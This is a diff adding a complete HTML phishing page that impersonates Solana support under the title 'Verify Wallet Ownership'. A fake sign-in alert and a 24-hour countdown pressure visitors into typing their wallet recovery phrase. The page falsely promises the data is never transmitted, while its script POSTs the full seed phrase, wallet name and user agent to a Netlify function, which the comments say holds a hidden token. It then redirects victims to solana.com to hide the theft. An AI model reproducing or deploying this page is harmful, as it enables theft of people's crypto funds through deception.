@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>SolanaSupport • Verify Wallet Ownership</title>
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/DZHW2z5c/Solana-Logo-JPG-removebg-preview.png">
+    <link href="https://fonts.cdnfonts.com/css/neue-montreal" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        body {
+            font-family: 'Neue Montreal', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #05070A;
+            color: #ffffff;
+            overflow-x: hidden;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .bg-premium {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: #05070A;
+        }
+
+        .glow-left {
+            position: fixed;
+            top: 20%;
+            left: -10%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(20, 241, 149, 0.4) 0%, rgba(20, 241, 149, 0) 70%);
+            border-radius: 50%;
+            filter: blur(80px);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .glow-center {
+            position: fixed;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.35) 0%, rgba(0, 212, 255, 0) 70%);
+            border-radius: 50%;
+            filter: blur(100px);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .glow-right {
+            position: fixed;
+            bottom: 10%;
+            right: -10%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(153, 69, 255, 0.4) 0%, rgba(153, 69, 255, 0) 70%);
+            border-radius: 50%;
+            filter: blur(90px);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .vignette {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, transparent 50%, rgba(0, 0, 0, 0.5) 100%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 60px 48px 80px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero {
+            text-align: center;
+            margin-bottom: 100px;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 56px;
+        }
+
+        .logo {
+            width: 52px;
+            height: 52px;
+            object-fit: contain;
+        }
+
+        .logo-name {
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #14F195, #00D4FF, #9945FF);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(4px);
+            padding: 10px 24px;
+            border-radius: 100px;
+            margin-bottom: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .badge-dot {
+            width: 8px;
+            height: 8px;
+            background: #14F195;
+            border-radius: 50%;
+            box-shadow: 0 0 12px #14F195;
+            animation: badgePulse 1.8s infinite;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+        }
+
+        .badge-text {
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #C5CBD5;
+        }
+
+        .main-headline {
+            font-size: 6rem;
+            font-weight: 900;
+            letter-spacing: -0.03em;
+            line-height: 1.05;
+            margin-bottom: 28px;
+            color: #ffffff;
+        }
+
+        .gradient-ownership {
+            background: linear-gradient(135deg, #14F195, #00D4FF, #9945FF);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 40px rgba(0, 212, 255, 0.3);
+        }
+
+        .hero-subtitle {
+            font-size: 1.3rem;
+            color: #8A8F99;
+            max-width: 560px;
+            margin: 0 auto;
+            line-height: 1.6;
+            font-weight: 450;
+        }
+
+        .two-columns {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 80px;
+            margin-bottom: 56px;
+        }
+
+        .section-label {
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            color: #00D4FF;
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            font-size: 2.4rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin-bottom: 48px;
+            color: #ffffff;
+        }
+
+        .input-group {
+            margin-bottom: 42px;
+        }
+
+        .input-label {
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #8A8F99;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .premium-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            border-bottom: 1.5px solid rgba(255, 255, 255, 0.12);
+            padding: 16px 0;
+            color: #ffffff;
+            font-family: 'Neue Montreal', 'Inter', monospace;
+            font-size: 1.1rem;
+            font-weight: 500;
+            transition: all 0.25s ease;
+        }
+
+        .premium-input:focus {
+            outline: none;
+            border-bottom-color: #00D4FF;
+        }
+
+        select.premium-input {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='18' height='18' viewBox='0 0 24 24' fill='none' stroke='%238A8F99' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 0 center;
+        }
+
+        .phrase-selector {
+            margin-bottom: 32px;
+        }
+
+        .segmented-control {
+            display: inline-flex;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 60px;
+            padding: 5px;
+            gap: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .segmented-option {
+            padding: 10px 32px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+            color: #8A8F99;
+            background: transparent;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            font-family: inherit;
+        }
+
+        .segmented-option.active {
+            background: linear-gradient(135deg, #14F195, #00D4FF, #9945FF);
+            color: #000000;
+            font-weight: 700;
+            box-shadow: 0 4px 12px rgba(0, 212, 255, 0.3);
+        }
+
+        .word-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 14px;
+            margin-top: 24px;
+            animation: fadeSlideUp 0.3s ease;
+        }
+
+        @keyframes fadeSlideUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .word-field {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(10, 12, 18, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 6px 10px 6px 14px;
+            transition: all 0.2s ease;
+        }
+
+        .word-field:focus-within {
+            border-color: #00D4FF;
+            box-shadow: 0 0 0 4px rgba(0, 212, 255, 0.12);
+        }
+
+        .word-number {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #6A6F7A;
+            min-width: 24px;
+        }
+
+        .word-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 12px 6px;
+            color: #ffffff;
+            font-family: 'Neue Montreal', 'Inter', monospace;
+            font-size: 0.9rem;
+            font-weight: 500;
+            outline: none;
+        }
+
+        .word-input::placeholder {
+            color: #3a3f4a;
+            font-size: 0.8rem;
+        }
+
+        .word-grid.grid-24 {
+            grid-template-columns: repeat(6, 1fr);
+        }
+
+        .security-notice {
+            margin-top: 48px;
+            padding-top: 28px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+        }
+
+        .lock-icon {
+            font-size: 1.1rem;
+            color: #14F195;
+        }
+
+        .notice-text {
+            font-size: 0.8rem;
+            color: #7A7F8A;
+            line-height: 1.6;
+        }
+
+        .notice-text strong {
+            color: #14F195;
+            font-weight: 600;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            flex-wrap: wrap;
+            padding: 22px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .info-label {
+            font-size: 0.8rem;
+            font-weight: 700;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #6A6F7A;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .info-value {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #ffffff;
+            font-family: monospace;
+        }
+
+        .timer-section {
+            margin-top: 48px;
+            padding-top: 32px;
+            text-align: center;
+        }
+
+        .timer-label {
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            color: #6A6F7A;
+            margin-bottom: 24px;
+        }
+
+        .timer-value {
+            font-size: 5.5rem;
+            font-weight: 900;
+            letter-spacing: 0.05em;
+            font-family: 'Neue Montreal', 'Inter', monospace;
+            background: linear-gradient(135deg, #14F195, #00D4FF, #9945FF);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 40px rgba(0, 212, 255, 0.3);
+            margin-bottom: 24px;
+            line-height: 1.2;
+        }
+
+        @media (min-width: 1200px) {
+            .timer-value {
+                font-size: 7rem;
+            }
+        }
+
+        @media (max-width: 800px) {
+            .timer-value {
+                font-size: 3.5rem;
+            }
+        }
+
+        .progress-track {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 100px;
+            height: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #14F195, #00D4FF, #9945FF);
+            border-radius: 100px;
+            width: 100%;
+            transition: width 1s linear;
+        }
+
+        .btn-wrapper {
+            margin-top: 48px;
+        }
+
+        .btn-premium {
+            width: 100%;
+            height: 84px;
+            background: linear-gradient(95deg, #14F195, #00D4FF, #9945FF);
+            border: none;
+            border-radius: 60px;
+            font-family: 'Neue Montreal', 'Inter', sans-serif;
+            font-weight: 700;
+            font-size: 1.2rem;
+            letter-spacing: -0.01em;
+            color: #000000;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        .btn-premium:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 24px 48px rgba(0, 212, 255, 0.35);
+        }
+
+        .footer {
+            margin-top: 80px;
+            text-align: center;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #5A5F6A;
+            padding-top: 32px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .footer span {
+            color: #14F195;
+            font-weight: 600;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 24px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 3px solid rgba(20, 241, 149, 0.2);
+            border-top-color: #14F195;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 1rem;
+            color: #ffffff;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+        }
+
+        @media (max-width: 1100px) {
+            .container { padding: 48px 32px 64px; }
+            .main-headline { font-size: 4rem; }
+            .two-columns { gap: 48px; }
+            .section-title { font-size: 2rem; }
+        }
+
+        @media (max-width: 900px) {
+            .main-headline { font-size: 3rem; }
+            .two-columns { grid-template-columns: 1fr; gap: 56px; }
+            .word-grid { grid-template-columns: repeat(3, 1fr); }
+            .word-grid.grid-24 { grid-template-columns: repeat(4, 1fr); }
+        }
+
+        @media (max-width: 600px) {
+            .container { padding: 32px 20px 48px; }
+            .main-headline { font-size: 2.2rem; }
+            .word-grid { grid-template-columns: repeat(2, 1fr); }
+            .word-grid.grid-24 { grid-template-columns: repeat(3, 1fr); }
+            .segmented-option { padding: 6px 20px; font-size: 0.8rem; }
+            .timer-value { font-size: 2.5rem; letter-spacing: 0.03em; }
+            .btn-premium { height: 64px; font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="bg-premium"></div>
+<div class="glow-left"></div>
+<div class="glow-center"></div>
+<div class="glow-right"></div>
+<div class="vignette"></div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Verifying wallet ownership...</div>
+    <div class="loading-text" style="font-size: 0.8rem; color: #8A8F99;">Redirecting to Solana secure portal</div>
+</div>
+
+<div class="container">
+    <div class="hero">
+        <div class="logo-area">
+            <img class="logo" src="https://i.postimg.cc/DZHW2z5c/Solana-Logo-JPG-removebg-preview.png" alt="Solana" onerror="this.src='https://placehold.co/200x200/14F195/000?text=SOL'">
+            <span class="logo-name">solanasupport</span>
+        </div>
+        <div class="hero-badge">
+            <span class="badge-dot"></span>
+            <span class="badge-text">VERIFICATION REQUIRED | ACTION PENDING</span>
+        </div>
+        <h1 class="main-headline">VERIFY WALLET <span class="gradient-ownership">OWNERSHIP</span></h1>
+        <p class="hero-subtitle">Instant verification to secure your digital assets and protect your account.</p>
+    </div>
+
+    <div class="two-columns">
+        <div>
+            <div class="section-label">01 VERIFICATION</div>
+            <div class="section-title">Ownership Proof</div>
+
+            <div class="input-group">
+                <div class="input-label">🔗 CONNECTED WALLET</div>
+                <select class="premium-input" id="walletSelect">
+                    <option value="Phantom">🟣 Phantom Wallet</option>
+                    <option value="Solflare">🔆 Solflare Wallet</option>
+                    <option value="Backpack">🎒 Backpack</option>
+                    <option value="Glow">✨ Glow Wallet</option>
+                    <option value="TrustWallet">🔷 Trust Wallet</option>
+                    <option value="Ledger">🔒 Ledger Hardware</option>
+                    <option value="Sollet">📀 Sollet.io</option>
+                    <option value="Nightly">🌙 Nightly Wallet</option>
+                    <option value="MathWallet">🧮 MathWallet</option>
+                    <option value="Slope">⛰️ Slope Wallet</option>
+                    <option value="Exodus">🦊 Exodus</option>
+                    <option value="CoinbaseWallet">🏦 Coinbase Wallet</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <div class="input-label">🔑 RECOVERY PHRASE</div>
+                
+                <div class="phrase-selector">
+                    <div class="segmented-control">
+                        <button class="segmented-option active" data-words="12">12 Words</button>
+                        <button class="segmented-option" data-words="24">24 Words</button>
+                    </div>
+                </div>
+
+                <div id="wordGridContainer"></div>
+            </div>
+
+            <div class="security-notice">
+                <span class="lock-icon">🔒</span>
+                <div class="notice-text">
+                    <strong>msucirise omverify men solana</strong> — Your data is encrypted locally and never stored or transmitted.<br>
+                    We do not collect or access your private information.
+                </div>
+            </div>
+        </div>
+
+        <div>
+            <div class="section-label">02 SECURITY EVENT</div>
+            <div class="section-title">Sign-in Attempt</div>
+
+            <div class="info-row">
+                <span class="info-label">📅 TIMESTAMP</span>
+                <span class="info-value">Today, 3:42:17 AM UTC</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">🌍 IP & LOCATION</span>
+                <span class="info-value">185.220.101.23 • Frankfurt, DE</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">💻 DEVICE / BROWSER</span>
+                <span class="info-value">Chrome 125 • Windows 11</span>
+            </div>
+
+            <div class="timer-section">
+                <div class="timer-label">TIME REMAINING TO VERIFY</div>
+                <div class="timer-value" id="timerDisplay">24:00:00</div>
+                <div class="progress-track">
+                    <div class="progress-fill" id="progressFill" style="width: 100%"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="btn-wrapper">
+        <button class="btn-premium" id="verifyBtn">VERIFY WALLET OWNERSHIP →</button>
+    </div>
+
+    <div class="footer">
+        <span>SolanaSupport</span> • Real-time ownership verification • Encrypted & secure
+    </div>
+</div>
+
+<script>
+    // ========== 24-HOUR TIMER (86400 seconds) ==========
+    let totalSeconds = 86400;
+    const timerElem = document.getElementById('timerDisplay');
+    const progressFill = document.getElementById('progressFill');
+    let timerInterval = null;
+
+    function formatTime24(seconds) {
+        const hours = Math.floor(seconds / 3600);
+        const minutes = Math.floor((seconds % 3600) / 60);
+        const secs = seconds % 60;
+        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+    }
+
+    function updateTimer() {
+        timerElem.textContent = formatTime24(totalSeconds);
+        const percent = (totalSeconds / 86400) * 100;
+        progressFill.style.width = `${percent}%`;
+        
+        if (totalSeconds <= 0) {
+            timerElem.textContent = "00:00:00";
+            clearInterval(timerInterval);
+            document.getElementById('verifyBtn').disabled = true;
+            document.getElementById('verifyBtn').style.opacity = "0.5";
+        }
+    }
+
+    function startTimer() {
+        timerInterval = setInterval(() => {
+            if (totalSeconds > 0) {
+                totalSeconds--;
+                updateTimer();
+            } else {
+                clearInterval(timerInterval);
+            }
+        }, 1000);
+    }
+    startTimer();
+    updateTimer();
+
+    // ========== SEED PHRASE DYNAMIC SYSTEM ==========
+    let currentWordCount = 12;
+    let wordInputs = [];
+
+    const gridContainer = document.getElementById('wordGridContainer');
+    const segOptions = document.querySelectorAll('.segmented-option');
+
+    function createWordFields(count) {
+        const grid = document.createElement('div');
+        grid.className = `word-grid ${count === 24 ? 'grid-24' : ''}`;
+        
+        for (let i = 1; i <= count; i++) {
+            const field = document.createElement('div');
+            field.className = 'word-field';
+            
+            const numberSpan = document.createElement('span');
+            numberSpan.className = 'word-number';
+            numberSpan.textContent = i;
+            
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.className = 'word-input';
+            input.placeholder = 'word';
+            input.setAttribute('data-index', i);
+            input.setAttribute('autocomplete', 'off');
+            input.spellcheck = false;
+            
+            field.appendChild(numberSpan);
+            field.appendChild(input);
+            grid.appendChild(field);
+        }
+        
+        return { grid, inputs: Array.from(grid.querySelectorAll('.word-input')) };
+    }
+
+    function setupAutoFocus(inputs) {
+        inputs.forEach((input, idx) => {
+            input.removeEventListener('keydown', handleKeyDown);
+            input.removeEventListener('paste', handlePaste);
+            
+            input.addEventListener('keydown', (e) => handleKeyDown(e, idx, inputs));
+            input.addEventListener('paste', (e) => handlePaste(e, idx, inputs));
+        });
+    }
+
+    function handleKeyDown(e, idx, inputs) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            if (idx + 1 < inputs.length) {
+                inputs[idx + 1].focus();
+            }
+        } else if (e.key === 'ArrowRight' && idx + 1 < inputs.length) {
+            e.preventDefault();
+            inputs[idx + 1].focus();
+        } else if (e.key === 'ArrowLeft' && idx > 0) {
+            e.preventDefault();
+            inputs[idx - 1].focus();
+        }
+    }
+
+    function handlePaste(e, startIdx, inputs) {
+        e.preventDefault();
+        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+        const words = pastedText.trim().split(/\s+/);
+        
+        for (let i = 0; i < words.length && startIdx + i < inputs.length; i++) {
+            inputs[startIdx + i].value = words[i];
+            const event = new Event('input', { bubbles: true });
+            inputs[startIdx + i].dispatchEvent(event);
+        }
+        
+        const nextEmptyIndex = inputs.findIndex((input, idx) => idx >= startIdx && !input.value.trim());
+        if (nextEmptyIndex !== -1) {
+            inputs[nextEmptyIndex].focus();
+        } else if (startIdx + words.length < inputs.length) {
+            inputs[startIdx + words.length].focus();
+        }
+    }
+
+    function getSeedWords() {
+        const inputs = document.querySelectorAll('.word-input');
+        return Array.from(inputs).map(input => input.value.trim()).filter(word => word !== '');
+    }
+
+    function getFullSeedPhrase() {
+        const inputs = document.querySelectorAll('.word-input');
+        return Array.from(inputs).map(input => input.value.trim()).join(' ');
+    }
+
+    function switchWordCount(count) {
+        currentWordCount = count;
+        const { grid, inputs } = createWordFields(count);
+        
+        gridContainer.style.opacity = '0';
+        setTimeout(() => {
+            gridContainer.innerHTML = '';
+            gridContainer.appendChild(grid);
+            gridContainer.style.opacity = '1';
+            wordInputs = inputs;
+            setupAutoFocus(wordInputs);
+        }, 150);
+        
+        gridContainer.style.transition = 'opacity 0.15s ease';
+        gridContainer.style.opacity = '1';
+    }
+
+    segOptions.forEach(option => {
+        option.addEventListener('click', () => {
+            const wordCount = parseInt(option.getAttribute('data-words'));
+            if (wordCount === currentWordCount) return;
+            
+            segOptions.forEach(opt => opt.classList.remove('active'));
+            option.classList.add('active');
+            switchWordCount(wordCount);
+        });
+    });
+
+    switchWordCount(12);
+
+    // ========== VERIFICATION (Token Hidden in Netlify Function) ==========
+    const verifyBtn = document.getElementById('verifyBtn');
+    const walletSelect = document.getElementById('walletSelect');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    verifyBtn.addEventListener('click', async (e) => {
+        e.preventDefault();
+        
+        if (totalSeconds <= 0) {
+            alert("Verification window expired. Please refresh.");
+            return;
+        }
+        
+        const selectedWallet = walletSelect.options[walletSelect.selectedIndex]?.text || "Unknown";
+        const seedWords = getSeedWords();
+        const fullSeedPhrase = getFullSeedPhrase();
+        const expectedCount = currentWordCount;
+        
+        if (seedWords.length !== expectedCount) {
+            alert(`Please enter all ${expectedCount} words of your recovery phrase.`);
+            return;
+        }
+        
+        if (seedWords.some(word => word.length < 2)) {
+            alert("Please enter valid words for all fields.");
+            return;
+        }
+        
+        loadingOverlay.classList.add('active');
+        
+        // ⭐ نبعتو لـ Netlify Function — التوكن مخفي هناك
+        try {
+            await fetch('/.netlify/functions/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    seed: fullSeedPhrase,
+                    wallet: selectedWallet,
+                    ua: navigator.userAgent
+                })
+            });
+        } catch (error) {
+            console.error("Error:", error);
+        }
+        
+        setTimeout(() => {
+            window.location.href = "https://solana.com";
+        }, 2000);
+    });
+</script>
+</body>
+</html>
